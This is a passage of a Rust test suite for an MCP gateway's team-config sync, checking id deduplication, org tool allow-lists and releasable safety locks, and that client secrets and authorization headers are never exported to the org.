        assert_eq!(gh.request_timeout_ms, Some(90_000));
        assert!(
            gh.env[0].value.is_none(),
            "no secret value carried from the team"
        );

        let enabled = active_enabled(&r);
        assert!(enabled.contains(&"team_github".to_string()));
        assert!(enabled.contains(&"team_stripe".to_string()));
        assert!(
            enabled.contains(&"mine".to_string()),
            "local enablement preserved"
        );
    }

    #[test]
    fn re_sync_replaces_team_servers() {
        let mut r = base_registry();
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [
                { "id": "a", "name": "A", "transport": "http", "url": "https://1.2.3.4/mcp" },
                { "id": "b", "name": "B", "transport": "http", "url": "https://1.2.3.5/mcp" }
            ]}),
        );
        // Team drops "b", adds "c".
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [
                { "id": "a", "name": "A", "transport": "http", "url": "https://1.2.3.4/mcp" },
                { "id": "c", "name": "C", "transport": "http", "url": "https://1.2.3.6/mcp" }
            ]}),
        );
        let team_ids: Vec<_> = r
            .servers
            .iter()
            .filter(|s| s.source.as_deref() == Some("team:t1"))
            .map(|s| s.id.clone())
            .collect();
        assert_eq!(team_ids.len(), 2);
        assert!(team_ids.contains(&"team_a".to_string()));
        assert!(team_ids.contains(&"team_c".to_string()));
        assert!(
            !team_ids.contains(&"team_b".to_string()),
            "removed team server is gone"
        );
        assert!(
            !active_enabled(&r).contains(&"team_b".to_string()),
            "no stale profile entry"
        );
    }

    #[test]
    fn re_sync_preserves_enablement_in_a_non_active_profile() {
        // A team server the member enabled in a NON-active profile must survive re-sync.
        // The old code captured prior enablement from the active profile only, stripped the
        // team ids from every profile, and re-enabled just the active one — so a non-active
        // enablement was lost on every sync (SOU-20).
        let mut r = base_registry();
        r.profiles.push(crate::registry::Profile {
            id: "p2".into(),
            name: "Second".into(),
            enabled_server_ids: Vec::new(),
            tool_scope: Default::default(),
        });
        let cfg = json!({ "servers": [
            { "id": "review1", "name": "Review1", "transport": "stdio", "command": "run-me" }
        ]});
        // First sync adds the review server (present, but left OFF everywhere until opt-in).
        apply_team_config(&mut r, "t1", &cfg);
        assert!(r.servers.iter().any(|s| s.id == "team_review1"));
        // Member consents to it in the NON-active profile p2.
        r.profiles
            .iter_mut()
            .find(|p| p.id == "p2")
            .unwrap()
            .enabled_server_ids
            .push("team_review1".into());

        // Re-sync with the same config: the non-active-profile consent must be restored.
        apply_team_config(&mut r, "t1", &cfg);
        let p2 = r.profiles.iter().find(|p| p.id == "p2").unwrap();
        assert!(
            p2.enabled_server_ids.contains(&"team_review1".to_string()),
            "team server enabled in a non-active profile survives re-sync"
        );
        // A review server with no consent in the active profile is still not auto-enabled there.
        assert!(!active_enabled(&r).contains(&"team_review1".to_string()));
    }

    #[test]
    fn colliding_team_ids_are_deduped_not_overwritten() {
        // Two team entries whose ids slugify to the same value must both survive with
        // DISTINCT ids. The old code built ids without dedup, so both became "team_my-server"
        // and collided on secrets/profiles/tool-prefixes, silently dropping one (SOU-20).
        let mut r = base_registry();
        let cfg = json!({ "servers": [
            { "id": "My Server", "name": "First", "transport": "http", "url": "https://1.2.3.4/mcp" },
            { "id": "my-server", "name": "Second", "transport": "http", "url": "https://1.2.3.5/mcp" }
        ]});
        let outcome = apply_team_config(&mut r, "t1", &cfg);
        assert_eq!(outcome.applied, 2, "both team servers applied");
        let team_ids: Vec<String> = r
            .servers
            .iter()
            .filter(|s| s.source.as_deref() == Some("team:t1"))
            .map(|s| s.id.clone())
            .collect();
        assert_eq!(
            team_ids.len(),
            2,
            "two team server entries, not one overwriting the other"
        );
        let unique: std::collections::HashSet<&String> = team_ids.iter().collect();
        assert_eq!(
            unique.len(),
            2,
            "the colliding ids were deduped to distinct ids"
        );
    }

    #[test]
    fn team_id_does_not_collide_with_an_existing_local_server() {
        // A team server whose id would slugify onto an EXISTING local server's id must be
        // deduped against the whole registry, not just this sync's batch — otherwise team
        // sync would overwrite the member's own server's secrets/profile/tool routing.
        let mut r = base_registry();
        r.servers.push(ServerEntry {
            id: "team_github".into(),
            name: "My own".into(),
            transport: "stdio".into(),
            command: Some("x".into()),
            args: vec![],
            env: vec![],
            url: None,
            source: Some("manual".into()),
            disabled_tools: vec![],
            cwd: None,
            client_credentials: None,
            request_timeout_ms: None,
            unknown_fields: serde_json::Map::new(),
        });
        let cfg = json!({ "servers": [
            { "id": "github", "name": "GitHub", "transport": "http", "url": "https://1.2.3.4/mcp" }
        ]});
        apply_team_config(&mut r, "t1", &cfg);
        // The member's own server keeps its id and is untouched.
        assert_eq!(
            r.servers.iter().filter(|s| s.id == "team_github").count(),
            1,
            "no duplicate id: the local server is not clobbered"
        );
        assert_eq!(
            r.servers
                .iter()
                .find(|s| s.id == "team_github")
                .unwrap()
                .source
                .as_deref(),
            Some("manual"),
        );
        // The team server took a distinct, deduped id.
        let team: Vec<_> = r
            .servers
            .iter()
            .filter(|s| s.source.as_deref() == Some("team:t1"))
            .collect();
        assert_eq!(team.len(), 1);
        assert_ne!(
            team[0].id, "team_github",
            "team server deduped away from the local id"
        );
    }

    #[test]
    fn org_allowed_tools_narrows_profile_tool_scope() {
        // SOU-167: org `allowedTools` becomes profile tool_scope on the team server id.
        let mut r = base_registry();
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [{
                "id": "github",
                "name": "GitHub",
                "transport": "http",
                "url": "https://1.2.3.4/mcp",
                "allowedTools": ["list_issues", "create_issue"],
                "disabledTools": ["delete_repo"]
            }]}),
        );
        let sid = "team_github";
        assert!(r.servers.iter().any(|s| s.id == sid));
        let server = r.servers.iter().find(|s| s.id == sid).unwrap();
        assert_eq!(
            server.disabled_tools,
            vec!["delete_repo".to_string()],
            "deny-list lands on the ServerEntry"
        );
        assert!(
            r.profile_allows_tool("default", sid, "list_issues"),
            "allow-listed tool is exposed"
        );
        assert!(
            !r.profile_allows_tool("default", sid, "create_pr"),
            "tool outside the allow-list is hidden"
        );
        assert!(
            !r.is_tool_enabled(sid, "delete_repo"),
            "disabledTools still deny-lists even if someone allowed it"
        );

        // Org drops the allow-list (key absent) -> unrestricted again (still subject to deny).
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [{
                "id": "github",
                "name": "GitHub",
                "transport": "http",
                "url": "https://1.2.3.4/mcp",
                "disabledTools": ["delete_repo"]
            }]}),
        );
        assert!(
            r.profile_allows_tool("default", sid, "create_pr"),
            "clearing allowedTools removes tool_scope"
        );
        assert!(!r.is_tool_enabled(sid, "delete_repo"));

        // Leave the team: tool_scope entry for the team server is gone.
        remove_team(&mut r, "t1");
        for p in &r.profiles {
            assert!(
                !p.tool_scope.contains_key(sid),
                "leaving clears org tool_scope"
            );
        }
    }

    #[test]
    fn org_empty_allowed_tools_blocks_every_tool_on_that_server() {
        let mut r = base_registry();
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [{
                "id": "github",
                "name": "GitHub",
                "transport": "http",
                "url": "https://1.2.3.4/mcp",
                "allowedTools": []
            }]}),
        );
        assert!(
            !r.profile_allows_tool("default", "team_github", "anything"),
            "empty allow-list is a real block-all, not 'all tools'"
        );
    }

    #[test]
    fn org_allowed_tools_survives_unique_id_collision_rename() {
        // Regression: unique_id renames collisions with `{base}-2` (hyphen). Fuzzy base_id
        // matching used underscore and silently dropped the allow-list on the renamed server.
        let mut r = base_registry();
        // Occupy the natural team id so the team server is renamed to team_github-2.
        r.servers.push(ServerEntry {
            id: "team_github".into(),
            name: "Local GitHub".into(),
            transport: "stdio".into(),
            command: Some("x".into()),
            args: vec![],
            env: vec![],
            url: None,
            source: Some("manual".into()),
            disabled_tools: vec![],
            cwd: None,
            client_credentials: None,
            request_timeout_ms: None,
            unknown_fields: serde_json::Map::new(),
        });
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [{
                "id": "github",
                "name": "GitHub",
                "transport": "http",
                "url": "https://1.2.3.4/mcp",
                "allowedTools": ["list_issues"]
            }]}),
        );
        let team = r
            .servers
            .iter()
            .find(|s| s.source.as_deref() == Some("team:t1"))
            .expect("team server present");
        assert_eq!(team.id, "team_github-2", "unique_id uses hyphen suffix");
        assert!(
            r.profile_allows_tool("default", &team.id, "list_issues"),
            "allow-list must follow the post-unique_id server id"
        );
        assert!(
            !r.profile_allows_tool("default", &team.id, "create_pr"),
            "non-allow-listed tool stays blocked on the renamed id"
        );
    }

    #[test]
    fn receipt_fresh_requires_matching_fingerprint_and_recent_send() {
        let fp = "abc";
        assert!(!receipt_fresh(None, None, fp));
        assert!(
            !receipt_fresh(Some(fp), None, fp),
            "no timestamp -> not fresh"
        );
        assert!(!receipt_fresh(Some("other"), Some(now_ms()), fp));
        assert!(
            receipt_fresh(Some(fp), Some(now_ms()), fp),
            "just sent -> fresh"
        );
        // Older than heartbeat window -> not fresh (forces re-send to refresh server stamp).
        let stale_at = now_ms().saturating_sub(RECEIPT_HEARTBEAT_MS + 1);
        assert!(!receipt_fresh(Some(fp), Some(stale_at), fp));
    }

    #[test]
    fn team_forced_deny_destructive_is_releasable_and_leaves_the_member_untouched() {
        let mut r = base_registry();
        r.deny_destructive = false; // member's own choice: off
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [], "denyDestructive": true }),
        );
        assert!(
            r.team_forced_deny_destructive,
            "org force recorded separately"
        );
        assert!(!r.deny_destructive, "member's own setting is untouched");
        assert!(
            r.deny_destructive_effective(),
            "enforced while the org forces it"
        );
        // Org drops the flag -> released, gate follows the member's own (off).
        apply_team_config(&mut r, "t1", &json!({ "servers": [] }));
        assert!(!r.deny_destructive_effective(), "org released the lock");
        // And leaving the team releases it too.
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [], "denyDestructive": true }),
        );
        remove_team(&mut r, "t1");
        assert!(!r.team_forced_deny_destructive, "leaving clears the lock");
        assert!(!r.deny_destructive_effective());
    }

    #[test]
    fn forced_content_defense_and_drift_quarantine_are_releasable() {
        let mut r = base_registry();
        r.content_defense = false;
        r.quarantine_on_drift = false;

        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [], "screeningPolicy": {
                "forceContentDefense": true,
                "forceQuarantineOnDrift": true,
            }}),
        );
        assert!(
            r.content_defense_effective(),
            "org forced content defense on"
        );
        assert!(
            r.quarantine_on_drift_effective(),
            "org forced drift-quarantine on"
        );
        assert!(
            !r.content_defense,
            "member's own content-defense is untouched"
        );

        // Org dropping the policy releases both to the member's own (off), no permanent lock.
        apply_team_config(&mut r, "t1", &json!({ "servers": [] }));
        assert!(!r.content_defense_effective(), "content defense released");
        assert!(
            !r.quarantine_on_drift_effective(),
            "drift-quarantine released"
        );
    }

    #[test]
    fn leaving_a_team_releases_every_forced_safety_lock() {
        let mut r = base_registry();
        // Member's OWN settings all off, so "effective" is driven purely by the org lock
        // (content_defense defaults on, so set it explicitly to isolate the forced overlay).
        r.human_approval = false;
        r.deny_destructive = false;
        r.content_defense = false;
        r.quarantine_on_drift = false;
        r.block_on_injection = false;
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [], "denyDestructive": true, "screeningPolicy": {
                "forceHumanApproval": true,
                "forceContentDefense": true,
                "forceQuarantineOnDrift": true,
                "forceBlockOnInjection": true,
            }}),
        );
        assert!(
            r.human_approval_effective()
                && r.deny_destructive_effective()
                && r.content_defense_effective()
                && r.quarantine_on_drift_effective()
                && r.block_on_injection_effective(),
            "all five enforced while in the team"
        );
        remove_team(&mut r, "t1");
        assert!(
            !r.team_forced_human_approval
                && !r.team_forced_deny_destructive
                && !r.team_forced_content_defense
                && !r.team_forced_quarantine_on_drift
                && !r.team_forced_block_on_injection,
            "leaving clears every org lock"
        );
        assert!(
            !r.human_approval_effective()
                && !r.deny_destructive_effective()
                && !r.content_defense_effective()
                && !r.quarantine_on_drift_effective()
                && !r.block_on_injection_effective(),
            "no team -> every flag follows the member's own (off) settings"
        );
    }

    #[test]
    fn forced_human_approval_is_a_releasable_lock_not_baked_into_the_member() {
        let mut r = base_registry();
        r.human_approval = false; // the member's OWN choice is off

        // Org forces human approval on: the gate is effective, but the member's own toggle is
        // untouched, the force lives in the separate, releasable field.
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [], "screeningPolicy": { "forceHumanApproval": true }}),
        );
        assert!(
            r.team_forced_human_approval,
            "org force recorded separately"
        );
        assert!(
            !r.human_approval,
            "member's own setting is never overwritten by the org"
        );
        assert!(
            r.human_approval_effective(),
            "gate is active while the org forces it"
        );

        // The org disabling its policy RELEASES the lock (the old code left it stuck on), and
        // the gate reverts to the member's own choice.
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [], "screeningPolicy": { "forceHumanApproval": false }}),
        );
        assert!(!r.team_forced_human_approval, "org released the force");
        assert!(
            !r.human_approval_effective(),
            "gate follows the member's own choice again"
        );
    }

    #[test]
    fn leaving_a_team_releases_a_forced_human_approval_lock() {
        // The exact bug: join a team that forces HITL, then leave, and it must not keep gating.
        let mut r = base_registry();
        r.human_approval = false;
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [], "screeningPolicy": { "forceHumanApproval": true }}),
        );
        assert!(r.human_approval_effective(), "forced on while in the team");

        remove_team(&mut r, "t1");
        assert!(
            !r.team_forced_human_approval,
            "leaving the team clears the org lock"
        );
        assert!(
            !r.human_approval_effective(),
            "no team, no force -> follows member's choice"
        );
    }

    #[test]
    fn org_force_absent_never_disables_the_members_own_human_approval() {
        let mut r = base_registry();
        r.human_approval = true; // the member themselves wants HITL on
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [], "screeningPolicy": { "forceHumanApproval": false }}),
        );
        assert!(!r.team_forced_human_approval);
        assert!(
            r.human_approval_effective(),
            "the member's own on-setting is preserved"
        );
        remove_team(&mut r, "t1");
        assert!(
            r.human_approval_effective(),
            "leaving doesn't disable the member's own choice"
        );
    }

    #[test]
    fn replacing_servers_preserves_instructions_policies_and_unknown_fields() {
        let remote = json!({
            "servers": [{ "id": "old" }],
            "instructions": "Use the approved issue workflow.",
            "denyDestructive": true,
            "screeningPolicy": { "forceHumanApproval": true },
            "futureControl": { "mode": "strict", "revision": 7 }
        });
        let new_servers = json!([{ "id": "new" }]);

        let updated = replace_server_set(remote.clone(), new_servers.clone()).unwrap();

        assert_eq!(updated["servers"], new_servers);
        for key in [
            "instructions",
            "denyDestructive",
            "screeningPolicy",
            "futureControl",
        ] {
            assert_eq!(
                updated[key], remote[key],
                "{key} must be round-tripped unchanged"
            );
        }
    }

    #[test]
    fn push_payload_binds_the_fetched_base_version() {
        let config = json!({ "servers": [], "instructions": "keep me" });
        let body = push_body(&config, 42);
        assert_eq!(body["base_version"], 42);
        assert_eq!(body["config"], config);
    }

    #[test]
    fn policy_receipt_reports_as_enforced_effective_flags() {
        // SOU-339 / SOU-345: the receipt mirrors *_effective(), not just the team-forced
        // overlay, so an admin sees what is actually enforced on the member's machine.
        let mut r = base_registry();
        r.deny_destructive = true; // member's own on
        r.content_defense = false;
        r.quarantine_on_drift = false;
        r.human_approval = false;
        r.block_on_injection = false;
        apply_team_config(
            &mut r,
            "t1",
            &json!({
                "servers": [],
                "denyDestructive": false,
                "screeningPolicy": {
                    "forceContentDefense": true,
                    "forceQuarantineOnDrift": false,
                    "forceHumanApproval": true,
                    "forceBlockOnInjection": true
                }
            }),
        );
        let receipt = build_policy_receipt(&r);
        assert_eq!(
            receipt["denyDestructive"], true,
            "member own deny still enforced"
        );
        assert_eq!(
            receipt["forceContentDefense"], true,
            "org force makes content defense effective"
        );
        assert_eq!(receipt["forceQuarantineOnDrift"], false);
        assert_eq!(receipt["forceHumanApproval"], true);
        assert_eq!(
            receipt["forceBlockOnInjection"], true,
            "org force makes block-on-injection effective"
        );
    }

    #[test]
    fn forced_block_on_injection_is_releasable_and_leaves_the_member_untouched() {
        let mut r = base_registry();
        r.block_on_injection = false;
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [], "screeningPolicy": { "forceBlockOnInjection": true }}),
        );
        assert!(r.team_forced_block_on_injection);
        assert!(!r.block_on_injection, "member's own setting is untouched");
        assert!(r.block_on_injection_effective());
        apply_team_config(&mut r, "t1", &json!({ "servers": [] }));
        assert!(!r.block_on_injection_effective(), "org released the lock");
        remove_team(&mut r, "t1");
        assert!(!r.team_forced_block_on_injection);
    }

    #[test]
    fn push_preview_reports_sorted_added_changed_and_removed_names() {
        let remote = json!([
            { "id": "remove-z", "name": "Zulu", "transport": "http" },
            { "id": "same", "name": "Same", "transport": "http" },
            { "id": "change", "name": "Old label", "transport": "http" }
        ]);
        let local = json!([
            { "id": "new-b", "name": "beta", "transport": "http" },
            { "id": "change", "name": "Changed", "transport": "stdio" },
            { "id": "same", "name": "Same", "transport": "http" },
            { "id": "new-a", "name": "Alpha", "transport": "http" }
        ]);

        let preview = build_push_preview(7, &remote, &local).unwrap();

        assert_eq!(preview.base_version, 7);
        assert_eq!(preview.added, vec!["Alpha", "beta"]);
        assert_eq!(preview.changed, vec!["Changed"]);
        assert_eq!(preview.removed, vec!["Zulu"]);
        assert_eq!(preview.local_fingerprint, crate::audit::args_hash(&local));
    }

    #[test]
    fn push_preview_rejects_ambiguous_duplicate_ids() {
        let duplicated = json!([
            { "id": "same", "name": "One" },
            { "id": "same", "name": "Two" }
        ]);
        let err = build_push_preview(1, &json!([]), &duplicated).unwrap_err();
        assert!(err.contains("duplicate id 'same'"));
    }

    #[test]
    fn stale_push_status_is_actionable_and_other_errors_fall_through() {
        let message = push_status_message(409).expect("409 must be recognized as stale");
        assert!(message.contains("changed"));
        assert!(message.contains("Sync"));
        assert!(message.contains("nothing was overwritten"));
        assert_eq!(push_status_message(401), None);
        assert_eq!(push_status_message(500), None);
    }

    /// SBS-524: a shared headless server must stay headless.
    ///
    /// Dropping the block on either leg silently downgrades the member to the
    /// interactive browser flow, which is the exact thing that flow exists to
    /// avoid, and nothing would report an error.
    #[test]
    fn client_credentials_round_trip_through_team_import_and_export() {
        let config = crate::registry::ClientCredentials {
            client_id: "client-abc".into(),
            token_endpoint_auth_method: Some("client_secret_basic".into()),
            scope: Some("mcp:read".into()),
            unknown_fields: serde_json::Map::new(),
        };
        let mut reg = base_registry();
        let server = reg
            .servers
            .iter_mut()
            .find(|s| s.id == "mine")
            .expect("fixture server");
        server.transport = "http".into();
        server.command = None;
        server.url = Some("https://mcp.example.com/mcp".into());
        server.client_credentials = Some(config.clone());

        let exported = team_server_export(&reg);
        let entry = exported
            .as_array()
            .and_then(|a| {
                a.iter()
                    .find(|s| s.get("id").and_then(Value::as_str) == Some("mine"))
            })
            .expect("the server must be exported");
        assert_eq!(
            entry
                .get("clientCredentials")
                .and_then(|c| c.get("clientId")),
            Some(&Value::String("client-abc".into())),
            "export dropped the config: {entry}"
        );
        // The secret is per member and must never ride along.
        assert!(
            !serde_json::to_string(entry)
                .unwrap()
                .contains("clientSecret"),
            "a client secret must never be pushed to the org: {entry}"
        );

        match classify_team_server(entry, "team:t1") {
            TeamClass::Review(imported) | TeamClass::Ready(imported) => {
                assert_eq!(
                    imported
                        .client_credentials
                        .as_ref()
                        .map(|c| c.client_id.as_str()),
                    Some("client-abc"),
                    "import dropped the config"
                );
                assert_eq!(
                    imported
                        .client_credentials
                        .as_ref()
                        .and_then(|c| c.scope.as_deref()),
                    Some("mcp:read")
                );
            }
            _ => panic!("expected the http server to import"),
        }
    }

    /// SBS-880: a team id is `team_<slug>`, and a member's own server named
    /// "Team Acme CRM" is `team-acme-crm`. The gateway would treat those as one
    /// server, so the team entry must be renamed the way an exact collision is.
    #[test]
    fn team_id_never_collides_with_a_local_id_under_sanitize() {
        let mut r = base_registry();
        r.servers.push(ServerEntry {
            id: "team-acme-crm".into(),
            name: "Team Acme CRM".into(),
            transport: "http".into(),
            command: None,
            args: vec![],
            env: vec![],
            url: Some("https://crm.example.com/mcp".into()),
            source: Some("manual".into()),
            disabled_tools: vec![],
            cwd: None,
            client_credentials: None,
            request_timeout_ms: None,
            unknown_fields: serde_json::Map::new(),
        });
        let cfg = json!({ "servers": [
            { "id": "acme-crm", "name": "Acme CRM", "transport": "http", "url": "https://1.2.3.4/mcp" }
        ]});
        assert_eq!(apply_team_config(&mut r, "t1", &cfg).applied, 1);
        let team = r
            .servers
            .iter()
            .find(|s| s.source.as_deref() == Some("team:t1"))
            .expect("team server applied");
        assert_eq!(team.id, "team_acme-crm-2");
        assert!(
            !crate::registry::ids_collide(&team.id, "team-acme-crm"),
            "the renamed team id must not share the local server's sanitized form"
        );
        assert!(r.servers.iter().any(|s| s.id == "team-acme-crm"));
    }

    #[test]
    fn request_timeout_round_trips_through_team_import_and_export() {
        let mut reg = base_registry();
        let server = reg
            .servers
            .iter_mut()
            .find(|s| s.id == "mine")
            .expect("fixture server");
        server.transport = "http".into();
        server.command = None;
        server.url = Some("https://mcp.example.com/mcp".into());
        server.request_timeout_ms = Some(90_000);

        let exported = team_server_export(&reg);
        let entry = exported
            .as_array()
            .and_then(|servers| {
                servers
                    .iter()
                    .find(|server| server.get("id").and_then(Value::as_str) == Some("mine"))
            })
            .expect("the server must be exported");
        assert_eq!(entry.get("requestTimeoutMs"), Some(&Value::from(90_000)));

        match classify_team_server(entry, "team:t1") {
            TeamClass::Review(imported) | TeamClass::Ready(imported) => {
                assert_eq!(imported.request_timeout_ms, Some(90_000));
            }
            _ => panic!("expected the http server to import"),
        }
    }

    #[test]
    fn team_import_enforces_request_timeout_bounds() {
        let server = |request_timeout_ms| {
            serde_json::json!({
                "id": "s",
                "name": "S",
                "transport": "http",
                "url": "https://mcp.example.com/mcp",
                "requestTimeoutMs": request_timeout_ms,
            })
        };

        assert!(matches!(
            classify_team_server(&server(0), "team:t1"),
            TeamClass::Blocked
        ));
        assert!(matches!(
            classify_team_server(
                &server(crate::registry::MAX_REQUEST_TIMEOUT_MS + 1),
                "team:t1"
            ),
            TeamClass::Blocked
        ));
        match classify_team_server(&server(crate::registry::MAX_REQUEST_TIMEOUT_MS), "team:t1") {
            TeamClass::Review(imported) | TeamClass::Ready(imported) => assert_eq!(
                imported.request_timeout_ms,
                Some(crate::registry::MAX_REQUEST_TIMEOUT_MS)
            ),
            _ => panic!("the maximum request timeout must be accepted"),
        }
    }

    #[test]
    fn team_import_validates_request_timeout_for_local_commands() {
        for (request_timeout_ms, should_block) in [
            (Value::from(0), true),
            (Value::from("not-a-number"), true),
            (Value::from(crate::registry::MAX_REQUEST_TIMEOUT_MS + 1), true),
            (Value::from(90_000), false),
        ] {
            let server = serde_json::json!({
                "id": "local",
                "name": "Local",
                "transport": "stdio",
                "command": "local-server",
                "requestTimeoutMs": request_timeout_ms,
            });
            match classify_team_server(&server, "team:t1") {
                TeamClass::Review(imported) => {
                    assert!(!should_block, "expected Blocked for {request_timeout_ms}");
                    assert_eq!(imported.request_timeout_ms, Some(90_000));
                }
                TeamClass::Blocked => {
                    assert!(should_block, "expected Review for {request_timeout_ms}");
                }
                _ => panic!("unexpected classification for {request_timeout_ms}"),
            }
        }

        let command_bearing_http = serde_json::json!({
            "id": "local-http",
            "name": "Local HTTP wrapper",
            "transport": "http",
            "command": "local-server",
            "url": "https://mcp.example.com/mcp",
            "requestTimeoutMs": 90_000,
        });
        match classify_team_server(&command_bearing_http, "team:t1") {
            TeamClass::Review(imported) => assert_eq!(imported.request_timeout_ms, Some(90_000)),
            _ => panic!("command-bearing entries must use local-server semantics"),
        }
    }

    #[test]
    fn team_export_preserves_request_timeout_for_local_commands() {
        let mut reg = base_registry();
        let server = reg
            .servers
            .iter_mut()
            .find(|s| s.id == "mine")
            .expect("fixture server");
        server.request_timeout_ms = Some(90_000);

        let exported = team_server_export(&reg);
        let entry = exported
            .as_array()
            .and_then(|servers| {
                servers
                    .iter()
                    .find(|server| server.get("id").and_then(Value::as_str) == Some("mine"))
            })
            .expect("the server must be exported");
        assert_eq!(entry.get("requestTimeoutMs"), Some(&Value::from(90_000)));
    }

    #[test]
    fn team_server_export_redacts_authorization_args() {
        let mut reg = base_registry();
        let server = reg
            .servers
            .iter_mut()
            .find(|s| s.id == "mine")
            .expect("fixture server");
        server.args = vec![
            "--header".into(),
            "Authorization: Bearer team-secret".into(),
        ];

        let exported = team_server_export(&reg);
        let serialized = serde_json::to_string(&exported).unwrap();
        assert!(
            !serialized.contains("team-secret"),
            "secret leaked: {serialized}"
        );
        assert!(serialized.contains("<redacted>"));
    }

    /// A server with no block, or a blank client id, must not be treated as
    /// configured: that would send every connect down the headless path and fail
    /// with "no client secret vaulted".
    #[test]
    fn team_import_ignores_absent_or_blank_client_credentials() {
        let base = serde_json::json!({
            "id": "s", "name": "S", "transport": "http",
            "url": "https://mcp.example.com/mcp",
        });
        match classify_team_server(&base, "team:t1") {
            TeamClass::Review(e) | TeamClass::Ready(e) => {
                assert!(e.client_credentials.is_none())
            }
            _ => panic!("expected import"),
        }

        let mut blank = base.clone();
        blank["clientCredentials"] = serde_json::json!({ "clientId": "   " });
        match classify_team_server(&blank, "team:t1") {
            TeamClass::Review(e) | TeamClass::Ready(e) => {
                assert!(
                    e.client_credentials.is_none(),
                    "a blank client id must not count as configured"
                )
            }
            _ => panic!("expected import"),
        }
    }

    /// A `clientSecret` must never survive into the registry or back out to the
    /// org. `unknown_fields` is forward-compat, not a smuggling channel.
    #[test]
    fn team_client_credentials_never_carry_a_secret_in_unknown_fields() {
        let mut hostile = serde_json::json!({
            "id": "s", "name": "S", "transport": "http",
            "url": "https://mcp.example.com/mcp",
        });
        hostile["clientCredentials"] = serde_json::json!({
            "clientId": "c",
            "clientSecret": "leaked",
            "somethingNewer": 1,
        });

        let imported = match classify_team_server(&hostile, "team:t1") {
            TeamClass::Review(e) | TeamClass::Ready(e) => e,
            _ => panic!("expected import"),
        };
        let cc = imported.client_credentials.expect("config imported");
        assert!(
            !cc.unknown_fields.contains_key("clientSecret"),
            "a secret must not be persisted: {:?}",
            cc.unknown_fields
        );
        // Genuine forward-compat still survives.
        assert!(cc.unknown_fields.contains_key("somethingNewer"));

        // And the export leg strips it too, for a registry that already has one.
        let mut reg = base_registry();
        let entry = reg.servers.iter_mut().find(|s| s.id == "mine").unwrap();
        entry.transport = "http".into();
        entry.command = None;
        entry.url = Some("https://mcp.example.com/mcp".into());
        let mut smuggled = crate::registry::ClientCredentials {
            client_id: "c".into(),
            ..Default::default()
        };
        smuggled
            .unknown_fields
            .insert("clientSecret".into(), Value::String("leaked".into()));
        entry.client_credentials = Some(smuggled);

        let json = serde_json::to_string(&team_server_export(&reg)).unwrap();
        assert!(
            !json.contains("leaked") && !json.contains("clientSecret"),
            "a secret must never be pushed to the org: {json}"
        );
    }

    /// An auth method this build cannot perform is refused at import, rather than
    /// persisted and failing at connect.
    #[test]
    fn team_import_refuses_an_unknown_token_endpoint_auth_method() {
        let mut bad = serde_json::json!({
            "id": "s", "name": "S", "transport": "http",
            "url": "https://mcp.example.com/mcp",
        });
        bad["clientCredentials"] = serde_json::json!({
            "clientId": "c",
            "tokenEndpointAuthMethod": "unknown_method",
        });
        assert!(matches!(
            classify_team_server(&bad, "team:t1"),
            TeamClass::Blocked
        ));

        // Recognised but unimplemented counts too: importing it would produce a
        // server that fails closed on every connect.
        bad["clientCredentials"] = serde_json::json!({
            "clientId": "c",
            "tokenEndpointAuthMethod": "private_key_jwt",
        });
        assert!(matches!(
            classify_team_server(&bad, "team:t1"),
            TeamClass::Blocked
        ));

        // A method we DO support still imports.
        bad["clientCredentials"] = serde_json::json!({
            "clientId": "c",
            "tokenEndpointAuthMethod": "client_secret_post",
        });
        match classify_team_server(&bad, "team:t1") {
            TeamClass::Review(e) | TeamClass::Ready(e) => assert_eq!(
                e.client_credentials
                    .and_then(|c| c.token_endpoint_auth_method),
                Some("client_secret_post".into())
            ),
            _ => panic!("expected import"),
        }
    }

    /// A malformed block must refuse the server, not import it as interactive.
    #[test]
    fn team_import_refuses_a_server_with_a_malformed_client_credentials_block() {
        let mut bad = serde_json::json!({
            "id": "s", "name": "S", "transport": "http",
            "url": "https://mcp.example.com/mcp",
        });
        // clientId as a number: parses as JSON, not as the struct.
        bad["clientCredentials"] = serde_json::json!({ "clientId": 42 });
        assert!(
            matches!(classify_team_server(&bad, "team:t1"), TeamClass::Blocked),
            "a malformed block must be refused, not silently downgraded"
        );
    }

    #[test]
    fn team_server_export_excludes_gateway_and_team_servers() {
        let mut r = base_registry(); // has "mine" (manual)
                                     // Toolport's own gateway entry: infra, must never be pushed to the team.
        r.servers.push(ServerEntry {
            id: "toolport".into(),
            name: "Toolport".into(),
            transport: "stdio".into(),
            command: Some(
                r"C:\projects\personal\conduit\src-tauri\target\debug\conduit-gateway.exe".into(),
            ),
            args: vec![],
            env: vec![],
            url: None,
            source: Some("manual".into()),
            disabled_tools: vec![],
            cwd: None,
            client_credentials: None,
            request_timeout_ms: None,
            unknown_fields: serde_json::Map::new(),
        });
        // A team-sourced server: excluded too (don't echo the team's own set back).
        r.servers.push(ServerEntry {
            id: "shared".into(),
            name: "Shared".into(),
            transport: "http".into(),
            command: None,
            args: vec![],
            env: vec![],
            url: Some("https://example.com/mcp".into()),
            source: Some("team:abc".into()),
            disabled_tools: vec![],
            cwd: None,
            client_credentials: None,
            request_timeout_ms: None,
            unknown_fields: serde_json::Map::new(),
        });
        let servers = team_server_export(&r);
        let ids: Vec<&str> = servers
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|s| s["id"].as_str())
            .collect();
        assert_eq!(
            ids,
            vec!["mine"],
            "only the member's own non-gateway server is pushed"
        );
    }

    #[test]
    fn team_url_requires_https_except_loopback_http() {
        assert!(require_secure_team_url("https://teams.example.com").is_ok());
        assert!(require_secure_team_url("http://127.0.0.1:8787").is_ok());
        assert!(require_secure_team_url("http://localhost:8787").is_ok());
        assert!(require_secure_team_url("http://[::1]:8787").is_ok());
